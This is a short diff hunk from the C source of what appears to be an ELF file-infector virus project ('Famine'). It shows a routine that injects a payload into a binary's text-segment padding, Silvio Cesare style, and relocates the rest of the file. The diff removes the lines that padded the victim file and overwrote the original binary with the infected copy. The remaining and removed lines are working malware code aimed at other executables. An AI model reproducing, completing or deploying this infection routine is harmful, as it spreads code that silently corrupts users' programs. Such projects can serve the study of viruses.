@@ -97,18 +97,4 @@ void silvio_text_infection(t_famine *famine)
     memcpy(famine->infected_file + famine->text_p_end_offset, famine->payload_data, famine->payload_size);
     // Insert rest of binary
     memcpy(famine->infected_file + famine->text_p_end_offset + PAGE_SIZE, famine->mmap_ptr + famine->text_p_end_offset, famine->binary_data_size - famine->text_p_end_offset);
-
-    // Add space in the original binary file and overwrite it with the infected file.
-    if (lseek(famine->input_file_fd, 0, SEEK_END) != -1)
-    {
-        char zero_fill[PAGE_SIZE];
-        bzero(zero_fill, PAGE_SIZE);
-        write(famine->input_file_fd, zero_fill, PAGE_SIZE);
-        // Write in the original file.
-        memcpy(famine->mmap_ptr, famine->infected_file, famine->infected_file_size);
-    }
-    else
-    {
-        close(famine->input_file_fd) == -1 ? error(ERROR_CLOSE, famine) : error(ERROR_LSEEK, famine);
-    }
 }
